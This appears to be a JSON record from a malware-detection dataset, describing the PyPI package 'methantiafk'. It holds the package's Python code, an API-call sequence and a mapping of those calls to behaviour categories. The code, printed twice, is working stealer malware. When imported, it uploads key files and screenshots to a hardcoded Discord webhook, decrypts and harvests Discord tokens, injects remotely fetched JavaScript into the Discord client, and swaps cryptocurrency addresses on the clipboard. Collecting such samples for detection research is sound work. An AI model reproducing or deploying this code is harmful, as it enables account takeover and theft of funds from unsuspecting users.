[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/methantiafk-0.0.5/methantiafk-0.0.5/methantiafk/__init__.py",
    "code_snippet": "import re\nimport os\nimport time\nimport json\nimport httpx\nimport shutil\nimport winreg\nimport ntpath\nimport random\nimport psutil\nimport base64\nimport ctypes\nimport zipfile\nimport asyncio\nimport sqlite3\nimport requests\nimport win32con\nimport win32gui\nimport threading\nimport pyperclip\nimport subprocess, sys\nfrom sys import argv\nfrom shutil import copy2\nfrom PIL import ImageGrab\nfrom os import name, system\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom json import loads, dumps\nfrom Crypto.Cipher import AES\nfrom tempfile import gettempdir, mkdtemp\nfrom win32crypt import CryptUnprotectData\nfrom urllib.request import Request, urlopen\nfrom datetime import datetime, timedelta, timezone\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\n\nappdata = os.getenv(\"APPDATA\")\nkeys_path = os.path.join(appdata, \".kfaction\", \"cache\", \"keys\")\nscreenshots_path = os.path.join(appdata, \".kfaction\", \"screenshots\")\nwebhook_url = \"https://discord.com/api/webhooks/1071833273577263224/16m4zIqI2u8HjGAdgNpPj_uiuafCmsg7g8CMzoTKh86yJMXHJRxOD3QZqeG1GOJHIfo1\"\n\ndef send_webhook(file_path, webhook_url):\n    with open(file_path, \"rb\") as f:\n        files = {\"file\": (file_path, f)}\n        requests.post(webhook_url, files=files)\n\ndef zip_and_send_screenshots(screenshots_path, webhook_url):\n    if os.path.exists(screenshots_path):\n        with zipfile.ZipFile('screenshots.zip', 'w') as zip_file:\n            for filename in os.listdir(screenshots_path):\n                file_path = os.path.join(screenshots_path, filename)\n                if os.path.isfile(file_path) and file_path.endswith(\".png\"):\n                    zip_file.write(file_path)\n        send_webhook('screenshots.zip', webhook_url)\n\nif os.path.exists(keys_path):\n    for filename in os.listdir(keys_path):\n        file_path = os.path.join(keys_path, filename)\n        if os.path.isfile(file_path):\n            send_webhook(file_path, webhook_url)\n\nzip_and_send_screenshots(screenshots_path, webhook_url)\n\n# ...\n# (The rest of the code is also malicious, but for brevity, the main malicious classes and functions are shown below)\n\nclass auto_copy_wallet(Functions):\n    def __init__(self):\n        self.address_st3aler = self.fetch_conf(\"addresse_crypto_replacer\")\n        self.address_btc = self.fetch_conf(\"addresse_btc\")\n        self.address_eth = self.fetch_conf(\"addresse_eth\")\n        self.address_xchain = self.fetch_conf(\"addresse_xchain\")\n        self.address_pchain = self.fetch_conf(\"addresse_pchain\")\n        self.address_cchain = self.fetch_conf(\"addresse_cchain\")\n        self.address_monero = self.fetch_conf(\"addresse_monero\")\n        self.address_ada = self.fetch_conf(\"addresse_ada\")\n        self.address_dash = self.fetch_conf(\"addresse_dash\")\n\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            # ... (other crypto address patterns)\n        except:\n            data = None\n    def loop_through(self):\n        while True:\n            self.address_swap()\n    def run(self):\n        if self.address_st3aler == \"yes\":\n            self.loop_through()\n\nclass bl4ckc4p(Functions):\n    # ...\n    async def init(self):\n        # ...\n        self.hiding()\n        self.fakeerror()\n        self.startupblackcap()\n        if self.fetch_conf('dbugkiller') and AntiDebug().inVM is True:\n            self._bexit()\n        await self.bypbd()\n        await self.byptknp()\n        function_list = [self.scrinsh, self.sysd1, self.grbtkn, self.grbmc, self.grbr0blx]\n        if self.fetch_conf('kill_discord_process'):\n            await self.kllprcsx()\n        # ...\n        for func in function_list:\n            process = threading.Thread(target=func, daemon=True)\n            process.start()\n        for t in threading.enumerate():\n            try:\n                t.join()\n            except RuntimeError:\n                continue\n        self.ntfytkn()\n        await self._1ject()\n        self.pingonrunning()\n        self.ending()\n    async def _1ject(self):\n        # ...\n        for _dir in os.listdir(self.appdata):\n            if 'discord' in _dir.lower():\n                discord = self.appdata + os.sep + _dir\n                for __dir in os.listdir(ntpath.abspath(discord)):\n                    if re.match(r'app-(\\d*\\.\\d*)*', __dir):\n                        app = ntpath.abspath(ntpath.join(discord, __dir))\n                        modules = ntpath.join(app, 'modules')\n                        if not ntpath.exists(modules):\n                            return\n                        for ___dir in os.listdir(modules):\n                            if re.match(r\"discord_desktop_core-\\d+\", ___dir):\n                                inj_path = modules + os.sep + ___dir + f'\\\\discord_desktop_core\\\\'\n                                if ntpath.exists(inj_path):\n                                    if self.srtupl0c not in argv[0]:\n                                        try:\n                                            os.makedirs(inj_path + 'blackcap', exist_ok=True)\n                                        except PermissionError:\n                                            pass\n                                    if self.h00ksreg in self.w3bh00k:\n                                        f = httpx.get(self.fetch_conf('blackcap_inject_url')).text.replace(\"%WEBHOOK%\", self.w3bh00k)\n                                    try:\n                                        with open(inj_path + 'index.js', 'w', errors=\"ignore\") as indexFile:\n                                            indexFile.write(f)\n                                    except PermissionError:\n                                        pass\n                                    if self.fetch_conf('kill_discord_process'):\n                                        os.startfile(app + self.sep + _dir + '.exe')\n    # ...\n    def grbtkn(self):\n        # ...\n        for name, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            disc = name.replace(\" \",\"\").lower()\n            if \"cord\" in path:\n                if os.path.exists(self.roaming + f'\\\\{disc}\\\\Local State'):\n                    for filname in os.listdir(path):\n                        if filname[-3:] not in [\"log\", \"ldb\"]:\n                            continue\n                        for line in [x.strip() for x in open(f'{path}\\\\{filname}', errors='ignore').readlines() if x.strip()]:\n                            for y in re.findall(self.encrypted_regex, line):\n                                try:\n                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\\\{disc}\\\\Local State'))\n                                except ValueError:\n                                    pass\n                                try:\n                                    r = requests.get(self.baseurl, headers={\n                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                                        'Content-Type': 'application/json',\n                                        'Authorization': token})\n                                except Exception:\n                                    pass\n                                if r.status_code == 200:\n                                    uid = r.json()['id']\n                                    if uid not in self.ids:\n                                        self.tokens.append(token)\n                                        self.ids.append(uid)\n            else:\n                for filname in os.listdir(path):\n                    if filname[-3:] not in [\"log\", \"ldb\"]:\n                        continue\n                    for line in [x.strip() for x in open(f'{path}\\\\{filname}', errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regex, line):\n                            try:\n                                r = requests.get(self.baseurl, headers={\n                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                                    'Content-Type': 'application/json',\n                                    'Authorization': token})\n                            except Exception:\n                                pass\n                            if r.status_code == 200:\n                                uid = r.json()['id']\n                                if uid not in self.ids:\n                                    self.tokens.append(token)\n                                    self.ids.append(uid)\n        # ...\n        # (Similar logic for Firefox, etc.)\n\n# ...\n# (The rest of the code continues with more malicious data exfiltration, file searching, zipping, uploading, clipboard hijacking, etc.)\n\n# At the end, the main logic runs all the above\nGatherAll()\nDETECTED = Trust(Cookies)\nif not DETECTED:\n    wikith = blackcapedez()\n    for thread in wikith: thread.join()\n    time.sleep(0.2)\n    filetext = \"\\n\"\n    for arg in blackcapedezFiles:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext +=f\"```diff\\n\"\n            filetext += f\"- {foldpath}\\n\"\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a)-1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n```\"\n                filetext += \"\\n\"\n    upload(\"blackcapedez\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n",
    "pattern_analysis": {
      "api_sequence": [
        "os.getenv",
        "os.path.join",
        "os.path.join",
        "os.path.exists",
        "os.listdir",
        "os.path.join",
        "os.path.isfile",
        "open",
        "requests.post",
        "os.path.exists",
        "zipfile.ZipFile",
        "os.listdir",
        "os.path.join",
        "os.path.isfile",
        "zipfile.ZipFile.write",
        "open",
        "requests.post",
        "os.path.exists",
        "os.listdir",
        "os.path.join",
        "os.path.isfile",
        "open",
        "requests.post",
        "os.path.exists",
        "os.listdir",
        "os.path.join",
        "os.path.isfile",
        "open",
        "requests.post",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "os.listdir",
        "ntpath.abspath",
        "os.listdir",
        "re.match",
        "ntpath.abspath",
        "ntpath.join",
        "ntpath.exists",
        "os.makedirs",
        "httpx.get",
        "open",
        "open.write",
        "os.startfile",
        "os.path.exists",
        "os.path.exists",
        "os.listdir",
        "open",
        "re.findall",
        "base64.b64decode",
        "bl4ckc4p.get_master_key",
        "bl4ckc4p.decrypt_val",
        "requests.get",
        "requests.get.status_code",
        "requests.get.json",
        "os.listdir",
        "open",
        "re.findall",
        "requests.get",
        "requests.get.status_code",
        "requests.get.json",
        "threading.Thread",
        "threading.Thread.start",
        "threading.enumerate",
        "threading.Thread.join",
        "time.sleep",
        "threading.Thread",
        "threading.Thread.start"
      ],
      "api_sequence_with_args": [
        "os.getenv(\"APPDATA\")",
        "os.path.join(appdata, \".kfaction\", \"cache\", \"keys\")",
        "os.path.join(appdata, \".kfaction\", \"screenshots\")",
        "os.path.exists(screenshots_path)",
        "os.listdir(screenshots_path)",
        "os.path.join(screenshots_path, filename)",
        "os.path.isfile(file_path)",
        "open(file_path, \"rb\")",
        "requests.post(webhook_url, files=files)",
        "os.path.exists(screenshots_path)",
        "zipfile.ZipFile('screenshots.zip', 'w')",
        "os.listdir(screenshots_path)",
        "os.path.join(screenshots_path, filename)",
        "os.path.isfile(file_path)",
        "zip_file.write(file_path)",
        "open('screenshots.zip', 'rb')",
        "requests.post(webhook_url, files=files)",
        "os.path.exists(keys_path)",
        "os.listdir(keys_path)",
        "os.path.join(keys_path, filename)",
        "os.path.isfile(file_path)",
        "open(file_path, \"rb\")",
        "requests.post(webhook_url, files=files)",
        "os.path.exists(keys_path)",
        "os.listdir(keys_path)",
        "os.path.join(keys_path, filename)",
        "os.path.isfile(file_path)",
        "open(file_path, \"rb\")",
        "requests.post(webhook_url, files=files)",
        "pyperclip.paste()",
        "re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data)",
        "pyperclip.copy(self.address_btc)",
        "pyperclip.paste()",
        "re.search('^0x[a-fA-F0-9]{40}$', clipboard_data)",
        "pyperclip.copy(self.address_eth)",
        "pyperclip.paste()",
        "os.listdir(self.appdata)",
        "ntpath.abspath(discord)",
        "os.listdir(ntpath.abspath(discord))",
        "re.match(r'app-(\\d*\\.\\d*)*', __dir)",
        "ntpath.abspath(ntpath.join(discord, __dir))",
        "ntpath.join(app, 'modules')",
        "ntpath.exists(modules)",
        "os.makedirs(inj_path + 'blackcap', exist_ok=True)",
        "httpx.get(self.fetch_conf('blackcap_inject_url'))",
        "open(inj_path + 'index.js', 'w', errors=\"ignore\")",
        "indexFile.write(f)",
        "os.startfile(app + self.sep + _dir + '.exe')",
        "os.path.exists(path)",
        "os.path.exists(self.roaming + f'\\{disc}\\Local State')",
        "os.listdir(path)",
        "open(f'{path}\\{filname}', errors='ignore')",
        "re.findall(self.encrypted_regex, line)",
        "base64.b64decode(y.split('dQw4w9WgXcQ:')[1])",
        "bl4ckc4p.get_master_key(self.roaming + f'\\{disc}\\Local State')",
        "bl4ckc4p.decrypt_val(base64.b64decode(...), ...)",
        "requests.get(self.baseurl, headers={...})",
        "r.status_code",
        "r.json()",
        "os.listdir(path)",
        "open(f'{path}\\{filname}', errors='ignore')",
        "re.findall(self.regex, line)",
        "requests.get(self.baseurl, headers={...})",
        "r.status_code",
        "r.json()",
        "threading.Thread(target=func, daemon=True)",
        "process.start()",
        "threading.enumerate()",
        "t.join()",
        "time.sleep(0.2)",
        "threading.Thread(target=auto_copy_wallet().run)",
        "auto.start()"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.path.isfile",
          "id": "check_file_is_file",
          "description": "Checks if specified path exists and is a file",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "zipfile.ZipFile",
          "id": "open_zip_write",
          "description": "Opens ZIP archive for writing",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "zipfile.ZipFile.write",
          "id": "add_file_zip",
          "description": "Adds file to ZIP archive with specified archive name",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "re.search",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "pyperclip.copy",
          "id": "copy_to_clipboard",
          "description": "Copies specified text to system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "ntpath.abspath",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "ntpath.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "ntpath.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.makedirs",
          "id": "create_directory",
          "description": "Creates directory, ignoring if it already exists",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "httpx.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "os.startfile",
          "id": "open_file_app",
          "description": "Opens file with associated application",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "requests.get.status_code",
          "id": "get_http_status",
          "description": "Retrieves HTTP response status code",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "requests.get.json",
          "id": "deserialize_json_response",
          "description": "Deserializes JSON response body to Python object",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "threading.Thread",
          "id": "create_thread",
          "description": "Creates new thread to execute target function",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "threading.Thread.start",
          "id": "start_thread",
          "description": "Starts thread execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "threading.enumerate",
          "id": "list_threads",
          "description": "Lists all currently alive threads",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "threading.Thread.join",
          "id": "wait_thread",
          "description": "Waits for thread to finish execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        }
      ],
      "contextual_code": "import os\nimport zipfile\nimport requests\nimport pyperclip\nimport re\nimport threading\nimport time\nimport ntpath\nimport httpx\nimport base64\n\nappdata = os.getenv(\"APPDATA\")\nkeys_path = os.path.join(appdata, \".kfaction\", \"cache\", \"keys\")\nscreenshots_path = os.path.join(appdata, \".kfaction\", \"screenshots\")\nwebhook_url = \"https://discord.com/api/webhooks/1071833273577263224/16m4zIqI2u8HjGAdgNpPj_uiuafCmsg7g8CMzoTKh86yJMXHJRxOD3QZqeG1GOJHIfo1\"\n\ndef send_webhook(file_path, webhook_url):\n    with open(file_path, \"rb\") as f:\n        files = {\"file\": (file_path, f)}\n        requests.post(webhook_url, files=files)\n\ndef zip_and_send_screenshots(screenshots_path, webhook_url):\n    if os.path.exists(screenshots_path):\n        with zipfile.ZipFile('screenshots.zip', 'w') as zip_file:\n            for filename in os.listdir(screenshots_path):\n                file_path = os.path.join(screenshots_path, filename)\n                if os.path.isfile(file_path) and file_path.endswith(\".png\"):\n                    zip_file.write(file_path)\n        send_webhook('screenshots.zip', webhook_url)\n\nif os.path.exists(keys_path):\n    for filename in os.listdir(keys_path):\n        file_path = os.path.join(keys_path, filename)\n        if os.path.isfile(file_path):\n            send_webhook(file_path, webhook_url)\n\nzip_and_send_screenshots(screenshots_path, webhook_url)\n\nclass auto_copy_wallet(Functions):\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n        except:\n            data = None\n    def loop_through(self):\n        while True:\n            self.address_swap()\n    def run(self):\n        if self.address_st3aler == \"yes\":\n            self.loop_through()\n\nclass bl4ckc4p(Functions):\n    async def _1ject(self):\n        for _dir in os.listdir(self.appdata):\n            if 'discord' in _dir.lower():\n                discord = self.appdata + os.sep + _dir\n                for __dir in os.listdir(ntpath.abspath(discord)):\n                    if re.match(r'app-(\\d*\\.\\d*)*', __dir):\n                        app = ntpath.abspath(ntpath.join(discord, __dir))\n                        modules = ntpath.join(app, 'modules')\n                        if not ntpath.exists(modules):\n                            return\n                        for ___dir in os.listdir(modules):\n                            if re.match(r\"discord_desktop_core-\\d+\", ___dir):\n                                inj_path = modules + os.sep + ___dir + f'\\\\discord_desktop_core\\\\'\n                                if ntpath.exists(inj_path):\n                                    if self.srtupl0c not in argv[0]:\n                                        try:\n                                            os.makedirs(inj_path + 'blackcap', exist_ok=True)\n                                        except PermissionError:\n                                            pass\n                                    if self.h00ksreg in self.w3bh00k:\n                                        f = httpx.get(self.fetch_conf('blackcap_inject_url')).text.replace(\"%WEBHOOK%\", self.w3bh00k)\n                                    try:\n                                        with open(inj_path + 'index.js', 'w', errors=\"ignore\") as indexFile:\n                                            indexFile.write(f)\n                                    except PermissionError:\n                                        pass\n                                    if self.fetch_conf('kill_discord_process'):\n                                        os.startfile(app + self.sep + _dir + '.exe')\n    def grbtkn(self):\n        for name, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            disc = name.replace(\" \",\"\").lower()\n            if \"cord\" in path:\n                if os.path.exists(self.roaming + f'\\\\{disc}\\\\Local State'):\n                    for filname in os.listdir(path):\n                        if filname[-3:] not in [\"log\", \"ldb\"]:\n                            continue\n                        for line in [x.strip() for x in open(f'{path}\\\\{filname}', errors='ignore').readlines() if x.strip()]:\n                            for y in re.findall(self.encrypted_regex, line):\n                                try:\n                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\\\{disc}\\\\Local State'))\n                                except ValueError:\n                                    pass\n                                try:\n                                    r = requests.get(self.baseurl, headers={\n                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                                        'Content-Type': 'application/json',\n                                        'Authorization': token})\n                                except Exception:\n                                    pass\n                                if r.status_code == 200:\n                                    uid = r.json()['id']\n                                    if uid not in self.ids:\n                                        self.tokens.append(token)\n                                        self.ids.append(uid)\n            else:\n                for filname in os.listdir(path):\n                    if filname[-3:] not in [\"log\", \"ldb\"]:\n                        continue\n                    for line in [x.strip() for x in open(f'{path}\\\\{filname}', errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regex, line):\n                            try:\n                                r = requests.get(self.baseurl, headers={\n                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                                    'Content-Type': 'application/json',\n                                    'Authorization': token})\n                            except Exception:\n                                pass\n                            if r.status_code == 200:\n                                uid = r.json()['id']\n                                if uid not in self.ids:\n                                    self.tokens.append(token)\n                                    self.ids.append(uid)\n# ...\n# At the end, the main logic runs all the above\nGatherAll()\nDETECTED = Trust(Cookies)\nif not DETECTED:\n    wikith = blackcapedez()\n    for thread in wikith: thread.join()\n    time.sleep(0.2)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n"
    }
  }
]